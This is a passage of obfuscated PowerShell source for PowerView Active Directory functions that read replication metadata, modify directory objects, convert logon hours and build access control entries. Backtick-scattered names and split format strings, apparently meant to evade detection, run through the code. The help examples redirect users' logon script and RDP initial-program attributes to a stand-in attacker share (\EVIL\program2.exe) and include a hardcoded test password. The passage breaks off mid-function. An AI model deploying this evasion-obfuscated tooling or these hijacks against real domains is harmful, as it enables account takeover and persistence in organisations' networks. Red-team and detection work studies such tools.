    3 CN=DomainLocalGroup,CN=Users,DC=testlab,DC=local


.EXAMPLE

'S-1-5-21-883232822-274137685-4173207997-519','af94f49e-61a5-4f7d-a17c-d80fb16a5220' | Get-DomainObjectLinkedAttributeHistory

ObjectDN              : CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 94e782c1-16a1-400b-a7d0-1126038c6387
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=dfm,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-06-13T22:20:02Z
TimeCreated           : 2017-06-13T22:20:02Z
LastOriginatingChange : 2017-06-13T22:20:22Z
Version               : 2
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

ObjectDN              : CN=Domain Admins,CN=Users,DC=testlab,DC=local
ObjectGuid            : af94f49e-61a5-4f7d-a17c-d80fb16a5220
AttributeName         : member
AttributeValue        : CN=Administrator,CN=Users,DC=testlab,DC=local
TimeDeleted           : 2017-03-06T00:48:29Z
TimeCreated           : 2017-03-06T00:48:29Z
LastOriginatingChange : 2017-03-06T00:48:29Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.EXAMPLE

Get-DomainObjectLinkedAttributeHistory ServerAdmins -Domain testlab.local

ObjectDN              : CN=ServerAdmins,CN=Users,DC=testlab,DC=local
ObjectGuid            : 603b46ad-555c-49b3-8745-c0718febefc2
AttributeName         : member
AttributeValue        : CN=jason.a,CN=Users,DC=dev,DC=testlab,DC=local
TimeDeleted           : 2017-04-10T22:17:19Z
TimeCreated           : 2017-04-10T22:17:19Z
LastOriginatingChange : 2017-04-10T22:17:19Z
Version               : 1
LastOriginatingDsaDN  : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First
                        -Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca
                        l

.OUTPUTS

PowerView.ADObjectLinkedAttributeHistory

Custom PSObject with translated replication metadata fields.

.LINK

https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${T`RUE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${idEn`Ti`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`D`A`pFILTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`ROp`er`TIeS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEarcHB`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SErV`Er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sear`Ch`SCopE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RESU`ltp`Ages`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RVerTi`M`ElImIt},

        [Switch]
        ${tomb`St`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrED`ENTI`Al} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${sea`RChE`Rar`gu`menTs} = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   ${TR`Ue}
        }
        if (${P`Sb`ouN`dpA`Ra`mEtErS}['Domain']) { ${se`ArchERA`RGUME`NtS}['Domain'] = ${DoMA`in} }
        if (${PS`BouN`dPA`RAMEters}['LDAPFilter']) { ${SEA`RCHERarg`Um`EnTs}['LDAPFilter'] = ${L`da`pF`ilTER} }
        if (${Psbo`U`NdP`ARa`mET`eRS}['SearchBase']) { ${sEa`RcHe`Rar`G`UM`eNtS}['SearchBase'] = ${Se`ArchB`AsE} }
        if (${P`Sbo`UndpAr`Ame`TeRS}['Server']) { ${sE`Arc`HE`Ra`R`GUMENts}['Server'] = ${SeRV`Er} }
        if (${PSbO`U`ND`pARaMe`TERS}['SearchScope']) { ${sE`ARC`hEra`Rgu`mENTs}['SearchScope'] = ${S`eaR`CHSC`Ope} }
        if (${pSB`Oun`DPA`Ramet`eRS}['ResultPageSize']) { ${seaR`c`Her`Ar`GUme`NtS}['ResultPageSize'] = ${r`ESULtP`A`gEsIze} }
        if (${psBo`U`Ndpa`RAMeTE`Rs}['ServerTimeLimit']) { ${seARC`H`eRARGum`entS}['ServerTimeLimit'] = ${Se`RVE`RtImElI`mIt} }
        if (${PsBO`UN`dPaR`A`ME`TeRs}['Tombstone']) { ${s`eA`Rc`hErARgUMeNTs}['Tombstone'] = ${tomB`S`T`ONe} }
        if (${P`sBOu`Ndp`Ar`A`MetERs}['Credential']) { ${SEArC`HE`R`ArGuMe`NTs}['Credential'] = ${c`RE`DeN`Tial} }

        if (${P`SBOundp`AR`A`meTERS}['Properties']) {
            ${pR`oP`ertYfI`l`TeR} = ${PSbouND`p`A`R`AMeTers}['Properties'] -Join '|'
        }
        else {
            ${PropeRTy`FIL`T`Er} = ''
        }
    }

    PROCESS {
        if (${pSBoun`D`pa`R`A`metErs}['Identity']) { ${SeaR`CHe`RAr`gu`MEn`TS}['Identity'] = ${i`D`En`TITy} }

        &("{1}{0}{2}{3}{4}"-f'omai','Get-D','nObj','ec','t') @SearcherArguments | &("{2}{1}{3}{0}"-f 'ct','ch','ForEa','-Obje') {
            ${Obje`Ct`DN} = ${_}.Properties['distinguishedname'][0]
            ForEach(${XM`LNodE} in ${_}.Properties['msds-replvaluemetadata']) {
                ${T`eMp`O`BjeCt} = [xml]${XML`NO`De} | &("{2}{0}{1}"-f'ct-Obje','ct','Sele') -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction ("{1}{2}{0}{3}" -f'yCon','S','ilentl','tinue')
                if (${TeM`pOBj`ect}) {
                    if (${TE`mPo`BJe`ct}.pszAttributeName -Match ${PrOPE`R`TY`Fil`TER}) {
                        ${out`P`Ut} = &("{2}{3}{1}{0}"-f't','jec','New-','Ob') ("{2}{0}{1}" -f 'bje','ct','PSO')
                        ${O`UTP`UT} | &("{1}{3}{0}{2}"-f'em','Add','ber','-M') ("{2}{0}{1}{3}"-f 'te','P','No','roperty') 'ObjectDN' ${oBJECt`dn}
                        ${oU`TPUt} | &("{1}{0}{2}" -f'b','Add-Mem','er') ("{0}{2}{1}" -f 'NoteP','y','ropert') 'AttributeName' ${T`emPo`B`JECT}.pszAttributeName
                        ${oUT`p`Ut} | &("{3}{1}{2}{0}" -f'r','d-Me','mbe','Ad') ("{0}{1}{2}"-f 'No','t','eProperty') 'AttributeValue' ${tem`poBj`eCT}.pszObjectDn
                        ${oUt`P`UT} | &("{1}{2}{0}" -f'er','Add-M','emb') ("{3}{0}{1}{2}" -f'o','tePro','perty','N') 'TimeCreated' ${T`eMPO`BjEct}.ftimeCreated
                        ${OU`TpuT} | &("{2}{1}{0}"-f'ber','d-Mem','Ad') ("{0}{2}{1}{3}" -f'NotePro','t','per','y') 'TimeDeleted' ${t`EmPo`B`ject}.ftimeDeleted
                        ${O`UTp`UT} | &("{1}{0}{2}{3}"-f 'dd-Me','A','mbe','r') ("{1}{3}{0}{2}" -f'eProper','N','ty','ot') 'LastOriginatingChange' ${teM`p`O`BjECT}.ftimeLastOriginatingChange
                        ${OutP`UT} | &("{2}{1}{0}"-f 'mber','Me','Add-') ("{2}{3}{0}{1}"-f 'ePrope','rty','N','ot') 'Version' ${teM`P`OBje`ct}.dwVersion
                        ${oU`Tp`UT} | &("{2}{0}{1}" -f'-Membe','r','Add') ("{1}{2}{0}"-f 'operty','NoteP','r') 'LastOriginatingDsaDN' ${TEmP`oB`Je`CT}.pszLastOriginatingDsaDN
                        ${oU`TP`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        ${OU`TpUT}
                    }
                }
                else {
                    &("{0}{3}{2}{1}" -f'Wri','rbose','-Ve','te') "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function sEt-dOMai`No`B`je`Ct {
<#
.SYNOPSIS

Modifies a gven property for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Splats user/object targeting parameters to Get-DomainObject, returning the raw
searchresult object. Retrieves the raw directoryentry for the object, and sets
any values from -Set @{}, XORs any values from -XOR @{}, and clears any values
from -Clear @().

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Set

Specifies values for one or more object properties (in the form of a hashtable) that will replace the current values.

.PARAMETER XOR

Specifies values for one or more object properties (in the form of a hashtable) that will XOR the current values.

.PARAMETER Clear

Specifies an array of object properties that will be cleared in the directory.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program.exe for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Set @{'countrycode'=1234; 'mstsinitialprogram'='\\EVIL\program2.exe'} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string:
(&(|(objectsid=S-1-5-21-890171859-3433809279-3366196753-1108)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object harmj0y
VERBOSE: Setting countrycode to 1234 for object harmj0y
VERBOSE: Get-DomainSearcher search string:
LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: Setting mstsinitialprogram to \\EVIL\program2.exe for object testuser
VERBOSE: Setting countrycode to 1234 for object testuser

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1108","testuser" | Set-DomainObject -Clear department -Verbose

Cleares the 'department' field for both object identities.

.EXAMPLE

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512


Set-DomainObject -Identity testuser -XOR @{useraccountcontrol=65536} -Verbose

VERBOSE: Get-DomainSearcher search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: Get-DomainObject filter string: (&(|(samAccountName=testuser)))
VERBOSE: XORing 'useraccountcontrol' with '65536' for object 'testuser'

Get-DomainUser testuser | ConvertFrom-UACValue -Verbose

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\primary\sysvol\blah.ps1

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: [Set-DomainObject] Setting 'scriptpath' to '\\EVIL\program2.exe' for object 'testuser'

Get-DomainUser -Identity testuser -Properties scriptpath

scriptpath
----------
\\EVIL\program2.exe
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${Tr`Ue}, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${id`eNTitY},

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        ${S`et},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${x`oR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Cl`E`Ar},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Oma`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${Ld`Ap`FiL`TER},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEArc`H`BAse},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`e`RvER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEa`RChSc`O`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`S`Ultpag`EsIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`R`VErtImE`L`IMIT},

        [Switch]
        ${t`oMB`stO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDen`T`IAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SE`A`R`C`heraRGU`MentS} = @{'Raw' = ${t`RUE}}
        if (${pS`B`ouNdPaRA`MEterS}['Domain']) { ${S`eA`RcHE`R`Ar`gUmeNtS}['Domain'] = ${D`OmAiN} }
        if (${p`SBOUNdPar`Am`eT`ers}['LDAPFilter']) { ${SEA`R`C`heR`ARGuM`ENTS}['LDAPFilter'] = ${LD`A`pFil`TeR} }
        if (${Ps`BoUNDP`ArAMET`eRS}['SearchBase']) { ${S`E`Ar`CheRARg`UmENTs}['SearchBase'] = ${seARcH`B`A`Se} }
        if (${pS`BouNdPA`RamE`TeRS}['Server']) { ${sE`ARCHE`RArG`UmE`Nts}['Server'] = ${Se`R`VER} }
        if (${PSBo`UnDp`A`RAmEt`E`Rs}['SearchScope']) { ${s`Ea`RchEra`RG`UMeNts}['SearchScope'] = ${Se`AR`CHs`cOPE} }
        if (${PSBoU`N`dPARa`m`Eters}['ResultPageSize']) { ${S`e`ArCHeRAr`gum`enTS}['ResultPageSize'] = ${r`ES`ULTPA`g`esiZE} }
        if (${Ps`BOunDp`AR`AmETerS}['ServerTimeLimit']) { ${SeaR`CH`e`RaRgU`menTs}['ServerTimeLimit'] = ${serVEr`Ti`MeLi`m`iT} }
        if (${psb`OU`Nd`Par`AMeTErS}['Tombstone']) { ${sE`Arc`hErARGu`mE`N`Ts}['Tombstone'] = ${T`ombSTo`Ne} }
        if (${psBoU`N`d`paraMeT`eRs}['Credential']) { ${S`earcHERAr`gU`Me`Nts}['Credential'] = ${CREdE`NT`i`AL} }
    }

    PROCESS {
        if (${PS`B`oUNDPARam`ETe`Rs}['Identity']) { ${sEA`Rc`hErAr`gU`Ments}['Identity'] = ${id`en`TitY} }

        # splat the appropriate arguments to Get-DomainObject
        ${raw`O`BJECT} = &("{2}{1}{3}{4}{0}" -f't','O','Get-Domain','bj','ec') @SearcherArguments

        ForEach (${O`Bj`EcT} in ${RaWObJ`E`cT}) {

            ${EN`T`Ry} = ${rawO`Bj`ecT}.GetDirectoryEntry()

            if(${PsbOUNDpA`R`AME`T`ERS}['Set']) {
                try {
                    ${P`sBouND`PARaME`T`E`RS}['Set'].GetEnumerator() | &("{2}{3}{0}{1}"-f 'bjec','t','For','Each-O') {
                        &("{2}{0}{1}{3}"-f'i','te-Verb','Wr','ose') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        ${en`Try}.put(${_}.Name, ${_}.Value)
                    }
                    ${E`NT`RY}.commitchanges()
                }
                catch {
                    &("{3}{0}{2}{1}" -f 't','ning','e-War','Wri') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if(${PsbOuNdP`A`RaMeT`Ers}['XOR']) {
                try {
                    ${PSBOUnDp`AR`AMEt`e`Rs}['XOR'].GetEnumerator() | &("{1}{0}{4}{3}{2}"-f'orEach','F','t','bjec','-O') {
                        ${PRO`p`ERtY`NamE} = ${_}.Name
                        ${pROp`ERty`xO`RvAL`UE} = ${_}.Value
                        &("{1}{2}{3}{0}" -f'e','Writ','e-Ve','rbos') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        ${t`yPENa`me} = ${ENt`Ry}.${PR`Ope`RT`YNamE}[0].GetType().name

                        # UAC value references- https://support.microsoft.com/en-us/kb/305144
                        ${P`RO`p`eRT`YvALuE} = $(${ENt`Ry}.${p`Ro`pERT`ynaMe}) -bxor ${PR`oP`ertY`xO`RvAlue}
                        ${eNt`Ry}.${PrO`Pert`Yn`AmE} = ${PropertY`V`A`luE} -as ${T`y`PEnaME}
                    }
                    ${e`N`TRY}.commitchanges()
                }
                catch {
                    &("{2}{0}{1}{3}"-f 'Warn','i','Write-','ng') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if(${pSBOun`d`pa`R`AmETE`Rs}['Clear']) {
                try {
                    ${ps`Boun`dPARaME`TE`Rs}['Clear'] | &("{3}{1}{2}{0}"-f't','ac','h-Objec','ForE') {
                        ${prOP`er`Ty`NamE} = ${_}
                        &("{1}{0}{2}" -f '-Verbo','Write','se') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        ${e`NtrY}.${p`R`operTyNA`me}.clear()
                    }
                    ${E`Nt`Ry}.commitchanges()
                }
                catch {
                    &("{2}{1}{0}" -f 'arning','te-W','Wri') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function CoNveR`T`FRoM-`LdA`plOGONHou`RS {
<#
.SYNOPSIS

Converts the LDAP LogonHours array to a processible object.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Converts the LDAP LogonHours array to a processible object.  Each entry
property in the output object corresponds to a day of the week and hour during
the day (in UTC) indicating whether or not the user can logon at the specified
hour.

.PARAMETER LogonHoursArray

21-byte LDAP hours array.

.EXAMPLE

$hours = (Get-DomainUser -LDAPFilter 'userworkstations=*')[0].logonhours
ConvertFrom-LDAPLogonHours $hours

Gets the logonhours array from the first AD user with logon restrictions.

.OUTPUTS

PowerView.LogonHours
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = ${t`RuE}, ValueFromPipelineByPropertyName = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${LogO`NHoursARr`Ay}
    )

    Begin {
        if(${loG`O`N`HoUrs`ARRAY}.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function CONVErTT`o-LoGO`N`Hou`RsAr`Ray {
            Param (
                [int[]]
                ${H`OUrsa`Rr}
            )

            ${lO`gOn`houRS} = &("{3}{0}{2}{1}"-f 'ew-O','t','bjec','N') ("{1}{0}"-f'l[]','boo') 24
            for(${i}=0; ${I} -lt 3; ${i}++) {
                ${b`yTe} = ${hoUR`Sa`Rr}[${i}]
                ${O`FFs`Et} = ${i} * 8
                ${s`TR} = [Convert]::ToString(${B`ytE},2).PadLeft(8,'0')

                ${L`OG`on`hours}[${OfFs`et}+0] = [bool] [convert]::ToInt32([string]${S`TR}[7])
                ${Log`oNh`OuRs}[${o`FfSeT}+1] = [bool] [convert]::ToInt32([string]${s`Tr}[6])
                ${lOg`ONh`OuRs}[${O`FfSet}+2] = [bool] [convert]::ToInt32([string]${S`Tr}[5])
                ${L`OGoNH`Ou`RS}[${OFF`seT}+3] = [bool] [convert]::ToInt32([string]${S`TR}[4])
                ${lO`GOn`HO`UrS}[${o`FFSET}+4] = [bool] [convert]::ToInt32([string]${s`Tr}[3])
                ${LOGOn`hOU`RS}[${o`F`FseT}+5] = [bool] [convert]::ToInt32([string]${s`TR}[2])
                ${l`oGonhO`U`RS}[${o`FFSet}+6] = [bool] [convert]::ToInt32([string]${s`TR}[1])
                ${loG`ON`h`oUrs}[${o`F`FsET}+7] = [bool] [convert]::ToInt32([string]${S`TR}[0])
            }

            ${lo`Go`Nho`UrS}
        }
    }

    Process {
        ${O`U`TPUT} = @{
            Sunday = &("{2}{1}{5}{4}{0}{3}"-f 'Arr','To-L','Convert','ay','rs','ogonHou') -HoursArr ${LogoNH`o`Urs`ARR`Ay}[0..2]
            Monday = &("{3}{5}{0}{2}{1}{4}" -f 'o','a','ursArr','ConvertT','y','o-LogonH') -HoursArr ${L`OGon`H`oURsA`RRay}[3..5]
            Tuesday = &("{1}{5}{3}{6}{4}{2}{0}"-f'rray','Con','sA','ertTo-Log','our','v','onH') -HoursArr ${loGON`h`O`Ursa`RrAY}[6..8]
            Wednesday = &("{0}{5}{6}{3}{4}{2}{1}" -f 'Conv','onHoursArray','og','-','L','e','rtTo') -HoursArr ${L`ogOnHo`URs`ARR`AY}[9..11]
            Thurs = &("{6}{0}{4}{2}{1}{3}{5}{7}"-f 'o','o','o-LogonH','urs','nvertT','Arr','C','ay') -HoursArr ${logONH`Ou`RS`A`RRAY}[12..14]
            Friday = &("{0}{1}{6}{3}{4}{2}{5}" -f'Conv','ertTo','sArr','ogo','nHour','ay','-L') -HoursArr ${l`oGOnHOURsA`RR`AY}[15..17]
            Saturday = &("{3}{0}{2}{4}{1}"-f 'n','HoursArray','vert','Co','To-Logon') -HoursArr ${L`ogOnHoU`RsArr`AY}[18..20]
        }

        ${O`UT`Put} = &("{1}{2}{0}"-f'ect','New-O','bj') ("{1}{0}"-f'ect','PSObj') -Property ${O`UTP`UT}
        ${OU`TP`UT}.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        ${Ou`Tput}
    }
}


function neW-AdObje`cT`Ac`CEsScONtR`OLenT`Ry {
<#
.SYNOPSIS

Creates a new Active Directory object-specific access control entry.

Author: Lee Christensen (@tifkin_)  
License: BSD 3-Clause  
Required Dependencies: None

.DESCRIPTION

Creates a new object-specific access control entry (ACE).  The ACE could be 
used for auditing access to an object or controlling access to objects.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER PrincipalSearchBase

The LDAP source to search through for principals, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Right

Specifies the rights set on the Active Directory object.

.PARAMETER AccessControlType

Specifies the type of ACE (allow or deny)

.PARAMETER AuditFlag

For audit ACEs, specifies when to create an audit log (on success or failure)

.PARAMETER ObjectType

Specifies the GUID of the object that the ACE applies to.

.PARAMETER InheritanceType

Specifies how the ACE applies to the object and/or its children.

.PARAMETER InheritedObjectType

Specifies the type of object that can inherit the ACE.

.EXAMPLE

$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()

Adds an ACE to all computer objects in the OU "Workstations" permitting the
user "itadmin" to read the confidential ms-Mcs-AdmPwd computer property.

.OUTPUTS

System.Security.AccessControl.AuthorizationRule
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${tr`Ue}, Mandatory = ${t`RUE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${pR`INCIP`ALI`DE`NTitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PR`IN`c`ipaLDomaIn},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SeR`V`Er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEarChs`C`O`PE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`sULt`PAg`e`sIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VeR`T`IMELImIt},

        [Switch]
        ${t`omB`StOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreD`ENTi`Al} = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = ${Tr`Ue})]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        ${RI`G`Ht},

        [Parameter(Mandatory = ${t`RuE}, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        ${AC`CE`SsC`On`TROLTYpe},

        [Parameter(Mandatory = ${tr`UE}, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        ${AUD`iTf`LAg},

        [Parameter(Mandatory = ${F`ALsE}, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = ${f`AlSE}, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = ${fA`LsE}, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        ${oBje`cT`T`yPe},

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        ${in`HER`iT`AN`cEtype},

        [Guid]
        ${in`hE`R`iTEDOB`jeCTtypE}
    )

    Begin {
        if (${p`RincIpaL`id`ENt`ItY} -notmatch '^S-1-.*') {
            ${PRinci`P`AlSEaRCheR`Ar`g`UmE`NTS} = @{
